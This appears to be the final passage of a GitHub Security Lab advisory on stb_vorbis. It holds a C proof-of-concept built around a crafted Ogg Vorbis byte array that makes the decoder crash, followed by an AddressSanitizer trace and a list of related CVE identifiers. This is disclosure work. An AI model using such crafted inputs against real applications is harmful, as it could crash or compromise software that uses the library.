                            0x6a,0xcb,0xb6,0x29,0xaa,0xa6,0x6a,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xba,0xaa,
                            0xad,0xdb,0xaa,0xab,0xaa,0xaa,0xab,0xaa,0xaa,0xab,0xba,0xaa,0xaa,0xaa,0xaa,0xea,0xba,0xb6,
                            0x6d,0xbb,0xa6,0x6a,0xaa,0xa6,0xab,0xba,0xae,0xea,0xba,0xae,0xaa,0xaa,0xaa,0xeb,0xda,0xb6,
                            0xed,0xca,0xa6,0xac,0xba,0xae,0xeb,0xba,0xae,0xeb,0xba,0xae,0xaa,0xba,0xae,0x2c,0xcb,0xb6,
                            0x2c,0xbb,0xa6,0xab,0xba,0xae,0xeb,0xba,0xae,0xeb,0xba,0xae,0xeb,0xba,0xae,0x6e,0xeb,0xb2,
                            0xad,0xca,0xae,0xec,0xba,0xb2,0x2b,0xcb,0xb2,0xeb,0xba,0xb2,0x2b,0xcb,0xb2,0x2c,0xcb,0x5c,
                            0xd5,0x55,0x5d,0xd7,0x75,0x5d,0xd7,0x95,0x65,0xdb,0x75,0x65,0xd9,0x96,0x6d,0xdb,0x96,0x65,
                            0xd7,0x76,0x5d,0x57,0x96,0x5d,0x59,0x96,0x5d,0xd7,0x95,0x5d,0x59,0xd7,0x6d,0x5d,0xb6,0x6d,
                            0x55,0x96,0x65,0x59,0x76,0x65,0x59,0x76,0x5d,0x59,0x96,0x6d,0xdf,0xb6,0x65,0xdb,0x76,0x65,
                            0x59,0x96,0x6d,0x59,0x96,0x65,0x59,0x96,0x5d,0x59,0xf6,0x75,0xd9,0xd6,0x6d,0x5b,0x76,0x65,
                            0x57,0x76,0x65,0x59,0x96,0x65,0x57,0xb6,0x65,0x59,0xb7,0x65,0xdb,0xb6,0x6d,0x5d,0x76,0x6d,
                            0x57,0xb6,0x65,0x5b,0x96,0x65,0x57,0x96,0x65,0x5b,0xb6,0x6d,0xdb,0xb6,0x6d,0x5b,0x96,0x6d,
                            0x59,0x76,0x65,0x5d,0x96,0x65,0xd9,0xb6,0x6d,0xdf,0xb6,0x6d,0xdf,0xd6,0x6d,0x5b,0x96,0x5d,
                            0x59,0x96,0x65,0x59,0x96,0x6d,0xdb,0xb6,0x6d,0x5b,0xd6,0x6d,0xdb,0xb6,0x75,0xd9,0x96,0x5d,
                            0xd9,0x96,0x6d,0x59,0x96,0x6d,0x5b,0xb7,0x75,0x5d,0xb7,0x6d,0xdb,0xb7,0x75,0x59,0x97,0x5d,
                            0xdb,0xb6,0x6d,0x59,0xd6,0x75,0x9b,0x6e,0xeb,0xba,0xed,0xd3,0x75,0x5b,0x96,0x65,0x5b,0x96,
                            0x6d,0x5d,0xb6,0x75,0x01,0x00,0x08,0x0b,0x0e,0x00,0x80,0x83,0x46,0x96,0x62,0xa9,0x21,0x77,
                            0x9e,0x81,0x25,0x12,0x33,0xa6,0xa0,0xa1,0x02,0x2b,0x34,0x64,0x45,0x00,0x10,0x05,0x00,0xc0,
                            0x20,0xc4,0x94,0x62,0x4a,0x21,0x84,0x98,0x52,0x4c,0x31,0x84,0x10,0x53,0x8a,0x29,0xc5,0x18,
                            0x63,0x8c,0x31,0xc6,0x18,0x63,0x8c,0x31,0xc6,0x98,0x52,0x8c,0x31,0xc6,0x18,0x63,0x8c,0x31,
                            0xc6,0x18,0x63,0x4a,0x29,0xc6,0x18,0x63,0x8c,0x31,0xc6,0x18,0x63,0x8c,0x09,0x00,0x00,0x07,
                            0x70,0x00,0x00,0x08,0xb0,0x10,0x0a,0x0d,0x59,0x09,0x00,0x00,0x01,0x00,0x58,0x4c,0xd7,0xf6,
                            0x35,0xd1,0x17,0x15,0xc7,0xf2,0x24,0xcf,0x77,0x1d,0x47,0xd2,0x3c,0x51,0xb8,0x2d,0x49,0xb2,
                            0x5c,0x97,0xef,0x59,0x92,0xa3,0xeb,0xa2,0x06,0x8a,0x64,0x7b,0x20,0x49,0xb2,0x2f,0xec,0xb2,
                            0x26,0xbb,0x26,0x00,0x00,0x00,0x82,0x00,0x00,0x03,0x11,0x21,0x31,0x06,0x24,0x02,0x00,0x41,
                            0x81,0x81,0x0c,0x00,0x31,0x40,0x48,0xe8,0x0c,0x11,0x8f,0x4e,0xe8,0xdf,0x2c,0xf9,0x71,0xf4,
                            0xd7,0x9b,0xc1,0xc5,0xa8,0x1a,0x73,0x00,0x80,0x82,0x10,0x11,0x91,0x99,0x51,0x10,0x1a,0x0f,
                            0x4b,0x43,0x22,0x42,0x6e,0x00,0x48,0x4c,0x50,0x48,0x06,0x8b,0x0f,0x80,0x8b,0x14,0xcb,0xc2,
                            0x27,0x71,0xc0,0xda,0xba,0x88,0xde,0x04,0xe2,0x1c,0x31,0xff,0xc8,0xd3,0x5b,0x1e,0x90,0x00,
                            0x05,0x40,0x88,0x63,0x80,0x02,0xc2,0x8d,0xda,0x9a,0x65,0xfe,0x37,0x1a,0xf3,0xd4,0x14,0x73,
                            0x0f,0x00,0x00,0x04,0x00,0x00,0xa0,0x9a,0x1e,0x00,0x00,0x00,0x8e,0x0d,0x20,0xa2,0x21,0x3a,
                            0x8c,0x0c,0x8d,0x0d,0x8e,0x10,0x90,0x8f,0x0e,0x0e,0x00,0x00,0x01,0x00,0x00,0x03,0x40,0x87,
                            0xf0,0x00,0x80,0x43,0x04,0x88,0x68,0x88,0x0e,0x23,0x43,0x63,0x83,0xa3,0xc3,0xe3,0x03,0x24,
                            0x24,0x00,0x00,0x10,0x40,0x00,0x02,0x00,0x00,0x00,0x04,0x10,0x80,0x80,0x80,0x00,0x00,0x00,
                            0x00,0x00,0x40,0x00,0x00,0x00,0x80,0x80,0x4f,0x67,0x67,0x53,0x00,0x00,0xc0,0x2e,0x00,0x00,
                            0x00,0x00,0x00,0x00,0x39,0x30,0x00,0x00,0x02,0x00,0x73,0xdc,0x00,0xcd,0x27,0x00,0x05,0x01,
                            0x0d,0x01,0x00,0x00,0x03,0x66,0xba,0x01,0x1e,0x38,0x89,0x8d,0x06,0xfc,0x00,0xd1,0x00,0x2e,
                            0xb3};
    size_t size = sizeof(data);

    int chan, samplerate;
    short *output;
    int samples = stb_vorbis_decode_memory(data, size, &chan, &samplerate, &output);
    if (samples >= 0)
        free(output);
    return 0;
}

```

1. Run the program to hit the error.

```
AddressSanitizer:DEADLYSIGNAL
=================================================================
==241158==ERROR: AddressSanitizer: SEGV on unknown address (pc 0x0000005001e0 bp 0x7ffc7060a860 sp 0x7ffc70608e40 T0)
==241158==The signal is caused by a READ memory access.
    #0 0x5001e0 in vorbis_decode_packet_rest(stb_vorbis*, int*, Mode*, int, int, int, int, int*) tests/../stb_vorbis.c:3231:22
    #1 0x4e1480 in vorbis_decode_packet(stb_vorbis*, int*, int*, int*) tests/../stb_vorbis.c:3453:11
    #2 0x4f4628 in vorbis_pump_first_frame(stb_vorbis*) tests/../stb_vorbis.c:3512:10
    #3 0x4f94b6 in stb_vorbis_open_memory tests/../stb_vorbis.c:5116:10
    #4 0x4fbfb1 in stb_vorbis_decode_memory tests/../stb_vorbis.c:5390:20

```
## CVE

* GHSL-2023-145 - CVE-2023-45661
* GHSL-2023-146 - CVE-2023-45662
* GHSL-2023-147 - CVE-2023-45663
* GHSL-2023-148 - CVE-2023-45664
* GHSL-2023-150 - CVE-2023-45666
* GHSL-2023-151 - CVE-2023-45667
* GHSL-2023-165 - CVE-2023-45675
* GHSL-2023-166 - CVE-2023-45676
* GHSL-2023-167 - CVE-2023-45677
* GHSL-2023-168 - CVE-2023-45678
* GHSL-2023-169 - CVE-2023-45679
* GHSL-2023-170 - CVE-2023-45680
* GHSL-2023-171 - CVE-2023-45681
* GHSL-2023-172 - CVE-2023-45682

## Credit

These issues were discovered and reported by GHSL team member [@JarLob (Jaroslav Lobačevski)](https://github.com/JarLob).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2023-145`, `GHSL-2023-146`, `GHSL-2023-147`, `GHSL-2023-148`, `GHSL-2023-149`, `GHSL-2023-150`, `GHSL-2023-151`, `GHSL-2023-165`, `GHSL-2023-166`, `GHSL-2023-167`, `GHSL-2023-168`, `GHSL-2023-169`, `GHSL-2023-170`, `GHSL-2023-171` or `GHSL-2023-172` in any communication regarding these issues.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information


